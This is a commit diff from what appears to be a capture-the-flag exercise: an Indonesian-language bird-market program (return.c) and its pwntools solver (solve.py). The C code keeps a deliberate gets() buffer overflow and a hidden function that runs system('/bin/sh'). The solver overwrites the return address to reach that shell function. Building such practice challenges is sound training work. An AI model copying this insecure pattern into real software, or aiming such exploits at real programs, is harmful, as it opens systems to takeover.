8bff3ae9151fe2d706ebe828cd35cb96fbbd059e
letmein <nyomanpradipta120@gmail.com>
2018-10-06 12:15:13 +0800

    soal return done

--- return.c
+++ return.c
@@ -2,30 +2,33 @@
 #include <string.h>
 #include <stdlib.h>
 
+int wallet = 18;
+char burung[8];
+
 void secret_message(){
   system("/bin/sh");
 }
 void buy_flag(){
-  printf("pilihan 1\n");
+  if(wallet < 999999999999) printf("kamu terlalu lemah dude :)\n");
 }
-void jual_dupa(){
+void jual_burung(){
     char buffer[64];
     getchar();
-    printf("jenis dupa apa yang kamu mau jual ?\n");
-    fflush(stdout);
+    printf("burung apa yang kamu mau jual ?\n");
+    printf(">>");
     gets(&buffer);
-    printf("yang kamu jual : \n%s\n",buffer);
+    printf("yang kamu jual : %s\n",buffer);
 }
 void menu(){
-  printf("+-----------------------+\n");
-  printf("TOKO DUPA DEWANDARU\n");
-  printf("+-----------------------+\n");
-  printf("1. buy flag (999999 stick dupa)\n");
-  printf("2. check stock dupa\n");
-  printf("2. harga dupa perbatang\n");
-  printf("3. jumlah dupa yg kamu miliki\n");
-  printf("4. jual dupa\n");
-  printf("5. exit\n");
+  printf("+--------------------------------+\n");
+  printf("------------PASAR BURUNG----------\n");
+  printf("+--------------------------------+\n");
+  printf("1. beli flag (999999 ruby)\n");
+  printf("2. beli garuda (10 ruby)\n");
+  printf("3. lihat burung yang udah di beli\n");
+  printf("4. jual burung\n");
+  printf("5. check wallet\n");
+  printf("6. exit\n");
 }
 
 int main()
@@ -42,15 +45,23 @@ int main()
     buy_flag();
     break;
     case '2' :
-    printf("pilihan 2");
+    if(wallet > 10){
+      printf("burung berhasil di beli\n");
+      wallet = wallet - 10;
+      strcpy(burung,"garuda");
+    } else printf("uang gak cukup!\n");
     break;
     case '3' :
-    printf("pilihan 3");
+    if(strlen(burung) == 0) printf("belum ada yang kamu beli!\n");
+    else printf("burung yg dah di beli : %s\n",burung);
     break;
     case '4' :
-    jual_dupa();
+    jual_burung();
     break;
     case '5' :
+    printf("isi wallet : %d ruby\n",wallet);
+    break;
+    case '6' :
     printf("makasih udah berkunjung :)");
     exit(0);
     break;
--- solve.py
+++ solve.py
@@ -2,11 +2,11 @@ from pwn import *
 
 r = process("./return")
 offset = 68
-target = p32(0x080485e6)
+target = p32(0x08048646)
 payload = ""
 payload += "A"*offset
 payload += target
 r.sendline("4")
 r.sendline(payload)
-r.recvuntil("jenis dupa apa yang kamu mau jual ?")
+r.recvuntil(">>")
 r.interactive()
